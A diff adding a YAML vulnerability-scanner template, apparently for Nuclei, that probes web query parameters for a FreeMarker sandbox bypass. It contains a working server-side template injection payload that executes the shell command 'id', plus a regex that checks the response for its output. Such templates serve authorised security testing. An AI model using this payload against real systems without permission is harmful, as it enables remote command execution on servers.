@@ -1,0 +1,37 @@
+id: freemarker-sandbox-bypass-ssti
+
+info:
+  name: Freemarker < 2.3.30 Sandbox Bypass - Server Side Template Injection
+  author: ritikchaddha
+  severity: high
+  description: |
+    Apache FreeMarker™ is a template engine: a Java library to generate text output (HTML web pages, e-mails, configuration files, source code, etc.) based on templates and changing data.
+  reference:
+    - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Java.md#freemarker---sandbox-bypass
+  metadata:
+    verified: true
+  tags: ssti,dast,freemarker
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'
+
+    payloads:
+      injection:
+        - "<#assign%20classloader=article.class.protectionDomain.classLoader><#assign%20owc=classloader.loadClass(%22freemarker.template.ObjectWrapper%22)><#assign%20dwf=owc.getField(%22DEFAULT_WRAPPER%22).get(null)><#assign%20ec=classloader.loadClass(%22freemarker.template.utility.Execute%22)>${dwf.newInstance(ec,null)(%22id%22)}"
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{injection}}"
+
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "uid=[0-9]+.*gid=[0-9]+.*"
+# digest: 4a0a00473045022100b5577e417caf5698d76f3cf7da7414f04e9be66d0cb15ff7ce9cf6648424d20d02206614926d9c4e239b7198e07da4b8b61829faf8dc55057ee0439b3b1e3fbb41fc:922c64590222798bb761d5b6d8e72950
